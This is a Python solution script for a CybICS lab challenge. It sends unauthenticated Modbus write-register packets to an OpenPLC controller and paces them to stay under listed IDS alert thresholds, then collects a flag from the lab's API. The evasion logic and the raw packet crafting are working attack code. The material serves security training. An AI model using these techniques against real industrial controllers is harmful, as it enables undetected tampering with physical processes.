#!/usr/bin/env python3
"""
CybICS IDS Evasion Challenge - Solution Script
Performs stealth Modbus writes that evade IDS detection by staying below thresholds.

Usage:
    python3 solve_ids_evasion.py [openplc_ip] [ids_url]

Default:
    openplc_ip = 172.18.0.3
    ids_url     = http://localhost:8443

Strategy:
    The IDS modbus_unauth_write rule triggers at 10 writes in 30 seconds.
    We send only 3 writes with 5-second delays, keeping us well below the threshold.
    We avoid touching any other ports to prevent port_scan or other rules from firing.
"""

import sys
import time
import socket
import struct
import argparse
import requests

parser = argparse.ArgumentParser(description="Solve the IDS Evasion Challenge")
parser.add_argument("openplc_ip", nargs="?", default="172.18.0.3",
                    help="OpenPLC IP address (default: 172.18.0.3)")
parser.add_argument("--ids-url", default="http://localhost:8443",
                    help="IDS base URL (default: http://localhost:8443)")
parser.add_argument("--writes", type=int, default=3,
                    help="Number of Modbus writes to send (default: 3, min: 3)")
parser.add_argument("--delay", type=float, default=5.0,
                    help="Delay in seconds between writes (default: 5.0)")
args = parser.parse_args()

PLC_IP = args.openplc_ip
IDS_URL = args.ids_url
NUM_WRITES = max(args.writes, 3)
WRITE_DELAY = args.delay


def build_modbus_write(transaction_id, register, value):
    """Build a raw Modbus TCP write single register (FC 0x06) packet"""
    protocol_id = 0
    length = 6  # Unit ID + FC + Register + Value
    unit_id = 1
    func_code = 0x06
    return struct.pack(">HHHBBHH", transaction_id, protocol_id, length,
                       unit_id, func_code, register, value)


def check_ids_running():
    """Verify IDS is active"""
    try:
        r = requests.get(f"{IDS_URL}/api/status", timeout=5)
        data = r.json()
        if not data.get("active"):
            print("[-] IDS is not running. Starting it...")
            requests.post(f"{IDS_URL}/api/start",
                          json={}, headers={"Content-Type": "application/json"}, timeout=5)
            time.sleep(2)
        print(f"[+] IDS is active")
        return True
    except Exception as e:
        print(f"[-] Cannot reach IDS: {e}")
        return False


def start_evasion():
    """Start the evasion challenge window"""
    print("\n[*] Starting evasion challenge window...")
    try:
        r = requests.post(
            f"{IDS_URL}/api/evasion/start",
            headers={"Content-Type": "application/json"},
            timeout=5,
        )
        data = r.json()
        if data.get("success"):
            print(f"[+] Evasion window started ({data['timeout']}s timeout)")
            return True
        else:
            print(f"[-] Failed: {data.get('message')}")
            return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def send_stealth_writes():
    """
    Send Modbus writes slowly to stay below detection thresholds.

    Key thresholds to evade:
    - modbus_unauth_write: 10 writes in 30s  -> we send 3 writes with delays
    - modbus_flood:        50 writes in 5s   -> nowhere close
    - port_scan:           5 ports in 10s    -> we only use port 502
    - syn_flood:           100 SYNs in 10s   -> we make 1 connection
    """
    print(f"\n[*] Sending {NUM_WRITES} stealth Modbus writes to {PLC_IP}:502")
    print(f"    Strategy: {WRITE_DELAY}s delay between writes")
    print(f"    Threshold: 10 writes/30s (we stay at {NUM_WRITES}/{WRITE_DELAY*NUM_WRITES:.0f}s)")
    print()

    try:
        # Single TCP connection to avoid multiple SYN packets
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((PLC_IP, 502))
        print(f"    [+] Connected to {PLC_IP}:502")

        for i in range(NUM_WRITES):
            # Write a harmless value to a register
            register = 1124
            value = 42 + i
            pkt = build_modbus_write(i + 1, register, value)

            s.send(pkt)
            resp = s.recv(256)

            print(f"    Write {i+1}/{NUM_WRITES}: register {register} = {value} "
                  f"(resp: {len(resp)} bytes)")

            # Wait between writes to stay under threshold
            if i < NUM_WRITES - 1:
                print(f"    Waiting {WRITE_DELAY}s...", end="", flush=True)
                time.sleep(WRITE_DELAY)
                print(" done")

        s.close()
        print(f"\n    [+] All {NUM_WRITES} writes sent successfully")
        return True

    except Exception as e:
        print(f"    [-] Modbus write failed: {e}")
        return False


def check_evasion():
    """Check if evasion was successful"""
    print("\n[*] Checking evasion result...")
    try:
        r = requests.get(f"{IDS_URL}/api/evasion/check", timeout=5)
        data = r.json()

        writes = data.get("modbus_writes_detected", 0)
        alerts = data.get("new_alerts", 0)
        success = data.get("success", False)

        print(f"    Modbus writes detected: {writes}/{data.get('writes_required', 3)}")
        print(f"    New IDS alerts: {alerts}")
        print(f"    Remaining time: {data.get('remaining', '?')}s")

        if success and data.get("flag"):
            print(f"\n{'='*60}")
            print(f"  FLAG: {data['flag']}")
            print(f"  {data['message']}")
            print(f"{'='*60}\n")
            return True
        elif alerts > 0:
            print(f"\n[-] DETECTED! {alerts} alert(s) were triggered.")
            print("    Tips:")
            print("    - Increase --delay to send writes more slowly")
            print("    - Don't run port scans during the evasion window")
            print("    - Use only port 502, no other connections")
            return False
        elif writes < 3:
            print(f"\n[-] Not enough writes detected ({writes}/3)")
            print("    The IDS needs to see your Modbus write packets.")
            print("    Make sure you're writing to the correct target.")
            return False
        else:
            print(f"\n[*] Writes detected but result not yet conclusive.")
            return False

    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def main():
    print("=" * 60)
    print("  CybICS IDS Evasion Challenge - Solution")
    print("  Stealth Modbus write below detection thresholds")
    print("=" * 60)

    # Step 1: Verify IDS
    if not check_ids_running():
        sys.exit(1)

    # Step 2: Start evasion window
    if not start_evasion():
        sys.exit(1)

    # Step 3: Wait a moment for evasion tracking to initialize
    time.sleep(1)

    # Step 4: Send stealth writes
    if not send_stealth_writes():
        sys.exit(1)

    # Step 5: Wait for packets to be processed
    print("\n[*] Waiting 2s for IDS to process packets...")
    time.sleep(2)

    # Step 6: Check result
    if not check_evasion():
        print("\n[!] Retrying in 3 seconds...")
        time.sleep(3)
        check_evasion()


if __name__ == "__main__":
    main()
